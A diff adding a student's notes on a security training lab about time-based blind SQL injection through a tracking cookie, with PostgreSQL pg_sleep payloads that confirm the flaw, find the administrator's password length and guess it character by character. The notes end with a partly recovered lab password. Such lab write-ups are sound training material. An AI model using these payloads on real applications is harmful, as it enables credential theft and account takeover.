@@ -1,0 +1,47 @@
+Blind SQL injection with time delays and information retrieval
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+ANALYSIS
+----------------------------
+1. Confirm vulnerability,
+	Oracle ->	dbms_pipe.receive_message(('a'),10)
+	Microsoft ->	WAITFOR DELAY '0:0:10'
+	PostgreSQL ->	SELECT pg_sleep(10)
+	MySQL ->	SELECT SLEEP(10)
+
+	' || (SELECT pg_sleep(10))--
+	its a postgres and its vulnerable
+
+2. Confirm users table exists in the database:
+	if the users exists sleep for 10 secs 
+	' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end) --  -> there is delay hence the querry is correct
+
+	' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end) -- -> there is immediate response no delay
+
+	' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users) --
+
+	the querry checks if the users table exists and the user administrator also exists in the db
+
+	-> there is delay hence the querry is true
+
+3. Enumerate password length,:
+	 ' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)-- -> There is delay hence querry is true
+
+
+	 ' || (select case when (username='administrator' and LENGTH(password)>25) then pg_sleep(10) else pg_sleep(-1) end from users)-- > no delay hence querry is false and password is less than 25 chars
+
+	 the password length is 20
+
+4. Enumerate password for admin:
+	' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
+	no delay hence the password doesnt start with a
+
+tq0xi42szf4v7ymK0"0
+tq0xfj
